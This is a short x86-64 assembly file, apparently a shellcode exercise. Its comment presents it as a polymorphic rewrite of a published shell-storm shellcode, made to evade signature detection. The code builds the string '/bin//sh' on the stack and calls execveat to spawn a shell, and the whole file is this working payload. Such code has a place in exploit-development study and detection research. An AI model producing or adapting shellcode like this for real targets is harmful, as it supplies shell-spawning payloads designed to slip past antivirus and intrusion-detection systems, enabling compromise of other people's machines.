global _start

section .text

;Polymorphic version of: https://shell-storm.org/shellcode/files/shellcode-905.html
;to evade signature detection

_start:
    xor r9,r9
    add r9, 0x42
    push r9
    pop rax
    inc ah
    cqo
    push rdx
    mov dword [rsp-8], 0x6e69622f       
    mov dword [rsp-4], 0x68732f2f
    sub rsp,8
    push rsp
    pop rsi
    mov r8, rdx
    mov r10, r8
    syscall
